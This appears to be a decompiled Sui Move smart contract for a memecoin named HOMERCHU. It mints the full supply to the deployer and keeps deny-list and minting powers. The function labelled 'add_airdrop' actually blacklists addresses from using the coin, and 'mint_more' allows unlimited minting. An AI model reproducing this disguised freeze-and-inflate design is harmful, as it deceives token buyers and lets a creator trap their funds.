module 0x959edcbf022c174d5442e153307d97e99f34c73f01dab513a869a3d8136b7a76::HOMERCHU {
    struct HOMERCHU has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<HOMERCHU>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<HOMERCHU>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: HOMERCHU, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<HOMERCHU>(arg0, 6, b"HOMERCHU", b"Sui Homerchu", b"Homerchu isn't real, he can't hurt you", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmVSipQoqhWZCuR9cwL8yAVcDi45safRtt84gHCUqg8fdP?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<HOMERCHU>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<HOMERCHU>>(0x2::coin::mint<HOMERCHU>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<HOMERCHU>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<HOMERCHU>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<HOMERCHU>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<HOMERCHU>>(0x2::coin::mint<HOMERCHU>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<HOMERCHU>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<HOMERCHU>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

